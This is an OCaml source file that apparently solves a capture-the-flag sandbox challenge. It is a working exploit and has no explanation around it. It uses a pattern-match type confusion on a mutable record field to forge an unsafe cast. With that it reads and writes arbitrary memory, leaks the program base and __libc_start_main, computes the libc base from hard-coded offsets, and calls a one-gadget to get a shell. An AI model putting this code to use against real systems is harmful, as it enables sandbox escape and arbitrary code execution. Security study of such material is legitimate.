open! Sos
open Printf
open Bytes

let xx = of_string "xx"
let str = of_string "dice"

type ('a, 'b) either = Left of 'a | Right of 'b
type ('a, 'b) blah = {a : bool; mutable b: ('a, 'b) either}

let hax x ltyp =
  match x with
  | {a=false; _}  -> failwith "Must be true"
  | {b=Left _; _} -> failwith "You must give right type"
  | _ when (x.b <- Left ltyp; false) -> failwith "unreachable"
  | {a=true; b=Right rtyp} -> rtyp

let magic v from = hax {a = true; b=Right v} from

let read_56value addr = ((magic (ref 1) (addr/2)).contents * 2) + 1

let write_56value addr value =
  (magic (ref 1) (addr/2)).contents <- value / 2

let read63 addr =
  (read_56value addr lsl 8) lor
  ((read_56value (addr - 2) lsr 8) land 0xff)

let write63 addr value =
  write_56value (addr - 2) (value lsl 8),
  write_56value addr (value lsr 8),
  ()

let rec find_elf_base addrStart =
  let addr = addrStart land -0x1000
   in if read_56value addr == 0x10102464c45 then
     addr else find_elf_base (addrStart - 0x1000)

let prog_leak = 2 * magic 0 "x"
let _ = printf "Program leak: 0x%x\n" prog_leak
let prog_base = find_elf_base prog_leak
let _ = printf "Program base: 0x%x\n" prog_base

(* We parse the call to __libc_start_main in entry point to get libc leak *)
let entry = prog_base + read63 (prog_base + 0x18)
let got_libc_start = ((read63 (entry + 38)) land 0xffffffff) + entry + 42
let libc_start = read63 got_libc_start
let _ = printf "__libc_start_main: 0x%x\n" libc_start

let binnum num = List.fold_left (fun res ind -> res ^ String.make 1
  (Char.chr ((num lsr (ind * 8)) land 0xff))) "" [0;1;2;3;4;5;6;7]

(*
let (off_libc_start, off_system, off_free, off_onegadget) =
  (0x26c20, 0x449c0, 0x1bd8e8, 0xcbd1a)
*)

let (off_libc_start, off_system, off_free, off_onegadget) =
  (0x23fb0, 0x449c0, 0x1bd8e8, 0xe5456)


let libc_base = libc_start - off_libc_start
let _ = printf "Libc base: 0x%x\n" libc_base

let libc_onegadget = libc_base + off_onegadget

(*
let _ = write63 libc_free_hook ((libc_system lsl 8) land 0xffffffff)
let _ = write63 (libc_free_hook + 4) (libc_system lsr 24)
let _ = printf "Hello: 0x%x\n" (read63 libc_free_hook)
*)

let system = magic (fun x -> x) (binnum libc_onegadget)
let _ = system 0xdeadbeef




